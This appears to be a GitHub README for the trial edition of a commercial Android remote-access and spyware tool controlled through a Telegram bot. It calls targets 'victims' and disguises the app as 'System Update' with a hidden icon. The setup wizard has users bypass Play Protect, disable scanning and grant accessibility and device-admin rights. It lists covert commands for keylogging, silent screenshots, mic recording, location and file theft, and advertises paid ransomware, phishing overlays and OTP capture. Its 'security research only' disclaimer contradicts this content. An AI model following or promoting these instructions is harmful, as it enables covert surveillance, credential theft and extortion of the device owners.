<div align="center">

# ArchonX_DeadLock_Security

### Rootless Android C2 — Trial Edition

**72h · 30 commands · manual bot setup**

[![Platform](https://img.shields.io/badge/platform-Android%2010%20→%2016-blue)]()
[![Version](https://img.shields.io/badge/version-1.0--trial-green)]()
[![Brand](https://img.shields.io/badge/brand-ArchonX__DeadLock__Security-purple)]()

*Trial build · paid version available on request*

</div>

---

## 📖 What This Is

**ArchonX_DeadLock_Security Trial** is a 72-hour trial of a rootless Android C2 controlled entirely through your own Telegram bot.

- **No relay** — victims talk directly to `api.telegram.org` over HTTPS
- **Your bot, your token** — one APK, every user adds their own bot
- **30 commands** during trial
- **72-hour window** from setup completion
- **Auto-branded** — the bot is named **ArchonX_DeadLock_Security** on setup

**Full version** (paid) unlocks ransomware, phishing overlays, multi-bot management, Bluetooth tracking, call auto-answer, full file control, shell, SMS/contacts/camera, and 80+ commands. Contact admin for pricing.

---

## ⏱ Trial Limits

| Limit | Value |
|---|---|
| **Duration** | 72 hours from bot setup completion |
| **Commands** | 30 (listed below) |
| **Screenshots** | 3 per day (resets 00:00 local) |
| **Mic recording** | 3 per day, max 5s each |
| **File download** | max 5 MB per file |
| **Location history** | 5 most recent points |
| **Notifications** | 5 most recent |
| **Call log** | 5 most recent |

When the trial ends, the bot replies only to `/help`, `/upgrade`, `/setup_status`. Everything else → `⏱ Trial expired. /upgrade`.

---

## 📱 Requirements

- **Android 10 → 16** (API 29 – 36)
- **Internet connection** (Wi-Fi or mobile data)
- **Telegram reachable** from your network
- **Physical access** to the device during install

---

## 📦 Installation

### 1. Download the APK

From **GitHub Releases** → latest `build-N` → **`app-release.apk`**

### 2. Install

1. Settings → Apps → Special access → **Install unknown apps** → allow for your file manager
2. Open the APK → **Install**
3. Play Protect warning → **Install anyway**
4. Open the app — launcher icon: **"System Update"**

### 3. Wizard (18 steps)

The wizard runs **once**. Do not skip steps.

| # | Step | Action |
|---|---|---|
| 1 | Runtime permissions | Allow SMS, contacts, phone, location, camera, mic, notifications, media |
| 2 | Background location | **Allow all the time** |
| 3 | Storage access | Allow all files (Android 11+) |
| 4 | Battery optimization | Ignore |
| 5 | Device Admin | Activate |
| 6 | App details | ⋮ → **Allow restricted settings** |
| 7 | Overlay | Allow |
| 8 | Accessibility | **Screen Optimization → ON** |
| 9 | Notification Listener | **System Notification Service → ON** |
| 10 | Usage access | Allow |
| 11 | Install unknown apps | Allow |
| 12 | Write settings | Allow |
| 13 | Do Not Disturb access | Allow |
| 14 | Play Protect | Scan off |
| 15 | Battery unrestricted (OEM) | Unrestricted |
| 16 | OEM autostart (MIUI/Samsung/etc) | ON |
| 17 | MIUI privacy (Camera/Mic) | Allow |
| 18 | MIUI lock screen notifications | ON |

OEM-specific steps skip automatically on non-matching devices.

**If interrupted:** wizard resumes from the last completed step on next open.

---

## 🤖 Bot Setup (one-time, manual)

After the wizard, the **Bot Setup** screen opens.

### 1. Create your bot

- Open **@BotFather** in Telegram
- Send `/newbot`
- Choose a display name → choose a username ending in `bot`
- **Copy the token** (looks like `1234567890:AAH...`)

### 2. Get your chat ID

- Open **@userinfobot** in Telegram
- Send `/start`
- **Copy the numeric ID** (looks like `8878802729`)

### 3. Enter both in the app

- Paste the **Bot Token**
- Paste the **Chat ID**
- Tap **Verify & Send Code**

The app validates both, then displays a **6-digit code**.

### 4. Confirm

- Open your bot in Telegram
- **Send it the 6-digit code** as a message
- The app confirms → applies branding → pushes commands → starts services
- **Launcher icon hides** after 4 seconds

### 5. Done

Your bot is now:
- Named **ArchonX_DeadLock_Security**
- Branded with description
- Has all 30 trial commands in the menu

Send `/help` to your bot from Telegram.

⚠️ **Bot is locked after setup.** Reinstall without an override code will be blocked. Contact admin if you need a legitimate reset.

---

## 📋 Trial Commands

### Meta

| Command | Purpose |
|---|---|
| `/help` | Full command list (shows paid-only too) |
| `/ping` | Latency check |
| `/status` | Device status |
| `/report` | Activity summary |
| `/session` | Show session ID |
| `/stop` | Stop current operation |
| `/health` | Full diagnostic |
| `/setup_status` | Trial status, remaining time |
| `/upgrade` | Upgrade info |

### Intel

| Command | Purpose |
|---|---|
| `/deviceinfo` | Hardware, OS, storage, RAM |
| `/ip` | Public IP |
| `/wifi` | Current WiFi SSID |
| `/cell` | Cell operator |
| `/sim` | SIM information |

### Spy

| Command | Purpose |
|---|---|
| `/lochistory [n≤5]` | Location history (5 max) |
| `/notif [n≤5]` | Recent notifications (5 max) |
| `/keylog` | Stored keystrokes |
| `/screenshot` | Silent screenshot (3/day) |
| `/clipboard` | Current clipboard |
| `/calls [n≤5]` | Recent call log (5 max) |

### Media

| Command | Purpose |
|---|---|
| `/mic [≤5s]` | Mic recording (3/day, 5s max) |

### Files

| Command | Purpose |
|---|---|
| `/files [path]` | Directory listing |
| `/download <path>` | Download file (≤5 MB) |
| `/apps` | Package names |
| `/apps_list` | App names + packages |

### Control

| Command | Purpose |
|---|---|
| `/toast <text>` | Show notification |
| `/fakenotif <text>` | Show notification |
| `/vibrate [ms]` | Vibrate device |
| `/flash on\|off` | Torch |
| `/lock` | Lock screen |

**Total: 30 commands.**

---

## 🔒 Paid-Only (Full Version)

Any command not in the list above replies:

🔒 Paid-only. /upgrade to unlock.


Paid-only includes:

- **Ransomware** — `/encrypt` `/decrypt` `/key` `/lock_screen` `/ransom_chat`
- **Phishing** — `/overlay` `/overlay_on`
- **Multi-bot** — `/add_bot` `/remove_bot` `/bot_list` `/bot_status` `/bot_rename`
- **Bluetooth** — `/bt_scan` `/bt_saved` `/bt_track`
- **Call automation** — `/call_auto_answer` `/fake_call_log` `/fake_call_log_delete`
- **Media** — `/frontcam` `/backcam` `/video` `/burst` `/gallery` `/gallery_recent` `/wamedia` `/callrec`
- **Spy** — `/sms` `/contacts` `/location` `/otp` `/browser_history` `/realtime_keylog` `/wa` `/tg` `/usage` `/clipboard_watch` `/notif_filter` `/unlockcap` `/on_app_open` `/contact_photos` `/profile`
- **File control** — `/shell` `/rm` `/mv` `/zip` `/unzip` `/upload`
- **Control** — `/fake_call` `/wallpaper` `/tts` `/disguise` `/set_icon` `/pretext` `/sendsms` `/resetpass`
- **Update** — `/apk_update` `/rollback` `/backup_self`
- **Migration** — `/migrate` `/migrate_status` `/migrate_abort`
- **Automation** — `/schedule` `/panic` `/beacon` `/silent`
- **Session** — `/use` `/background` `/check_online`

---

## 🛠 Troubleshooting

### Bot not replying

- Check device internet (Wi-Fi or mobile data on)
- Check Telegram reachable from the device's network
- Send `/ping` to your bot
- If still silent: `/health services` — check C2Service is ✅

### "Trial Already Used" on fresh install

- This device previously ran a trial. Contact admin for an override code
- Legitimate reinstall (factory reset, phone swap) → admin will provide the code

### APK won't install

- **Unknown sources** must be allowed for your file manager
- **Play Protect** — tap "Install anyway"
- **Restricted settings** (Android 13+) — App details → ⋮ → Allow restricted settings
- If "App not installed" — uninstall the old version first (signature change during trial updates)

### Setup screen won't accept token

- Token must contain `:` and be at least 20 characters
- Bot must be reachable — send `/start` to it once from Telegram first
- Chat ID must be your **private** chat with the bot (no group chats)

### Bot doesn't respond after code sent

- Code expires after 5 minutes — tap Verify again to generate a new one
- Make sure you sent the code to **your bot**, not to another chat
- Code must be exact — no spaces, no extra characters

### Trial commands fail with permission errors

- Settings → Apps → System Update → Permissions → enable missing permission
- Accessibility / Notification Listener may need to be re-enabled after reboot (some OEMs)

### Device shows no online status

- Check `/health` in bot — services must be ✅
- Force stop the app and reopen once
- Reboot device (services auto-restart)

---

## 💰 Upgrade to Full

**Full version includes:**

- Ransomware suite (AES-256 encryption + negotiation chat)
- Phishing overlays (bank / Google / PayPal / crypto templates)
- Multi-bot management (unlimited admins per victim)
- Bluetooth tracker (surveillance detection)
- Call auto-answer with whitelist + auto-record
- Full file control + shell execution
- SMS / contacts / camera / gallery
- APK update + migration
- Scheduled tasks
- 80+ commands, unlimited use
- No trial timer

**Contact:** `ArchonX Owner`

**Price:** `contact ArchonX owner`

**Upgrade is seamless.** The full APK uses the same signing key — install over trial, prefs preserved, no re-setup.

---

## 🔐 Bot Lock & Reinstall

- **One setup per install** — the bot cannot be changed after confirmation
- **Reinstall detection** — internal + SD card + MediaStore markers prevent trial abuse
- **Override code** — for legitimate reinstalls (factory reset, device swap), contact admin with your device ID

**If you factory reset the phone:** trial is over. Contact admin for a fresh device code.

---

## ⚠️ Legal

**Authorized use only.**

This software is provided for **security research and testing on devices you own**. Use against devices you do not own or without consent is illegal in most jurisdictions and strictly prohibited.

- Rootless Android — no exploitation of system vulnerabilities
- Uses standard public APIs (Telegram Bot API, Android SDK)
- Abuses only user-granted permissions

**The user is solely responsible for compliance with all applicable laws in their jurisdiction.**

**ArchonX_DeadLock_Security** does not condone unauthorized use of this software. By installing, you accept full legal responsibility.

---

<div align="center">

### 🏴 ArchonX_DeadLock_Security

*Where silence becomes precision.*

**Trial Edition** — 72h · 30 commands

*Built with discipline · Shipped clean*

</div>
